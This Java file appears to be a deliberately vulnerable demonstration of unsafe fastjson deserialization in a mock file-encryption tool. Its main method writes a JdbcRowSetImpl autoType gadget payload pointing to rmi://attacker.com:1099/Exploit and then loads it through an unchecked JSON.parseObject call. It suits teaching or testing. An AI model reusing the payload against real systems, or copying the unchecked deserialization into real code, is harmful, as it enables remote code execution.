import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.function.*;
import java.util.stream.*;
import com.alibaba.fastjson.*;

public class FileEncryptor {
    static class EncryptionConfig {
        String key;
        String algorithm;
        int iterationCount;
        
        public EncryptionConfig(String key, String algorithm, int iterationCount) {
            this.key = key;
            this.algorithm = algorithm;
            this.iterationCount = iterationCount;
        }
    }

    static class FastJsonConvert {
        public static <T> T convertJSONToObject(String json, Class<T> clazz) {
            // 模拟不安全的反序列化：未启用类型验证
            return JSON.parseObject(json, clazz);
        }

        public static <T> List<T> convertJSONToArray(String json, Class<T> clazz) {
            return JSON.parseArray(json, clazz);
        }
    }

    public static void saveConfig(String path, EncryptionConfig config) {
        try {
            String json = JSON.toJSONString(config);
            Files.write(Paths.get(path), json.getBytes());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static EncryptionConfig loadConfig(String path) {
        try {
            String json = new String(Files.readAllBytes(Paths.get(path)));
            // 漏洞点：直接反序列化不可信数据
            return FastJsonConvert.convertJSONToObject(json, EncryptionConfig.class);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static void decryptFile(String inputPath, String outputPath, String configPath) {
        EncryptionConfig config = loadConfig(configPath);
        if (config == null) return;

        try {
            // 模拟解密操作（实际应使用真实加密逻辑）
            String content = new String(Files.readAllBytes(Paths.get(inputPath)));
            String decrypted = content.replace(config.key, "DEC_" + config.key);
            Files.write(Paths.get(outputPath), decrypted.getBytes());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        // 正常使用示例
        EncryptionConfig config = new EncryptionConfig("secretKey123", "AES", 1000);
        saveConfig("config.json", config);
        
        // 模拟攻击者篡改配置文件
        try {
            String maliciousJSON = "{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"rmi://attacker.com:1099/Exploit\\",\\"autoCommit\\":true}";
            Files.write(Paths.get("malicious_config.json"), maliciousJSON.getBytes());
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        // 触发漏洞（当加载恶意配置时）
        decryptFile("input.txt", "output.txt", "malicious_config.json");
    }
}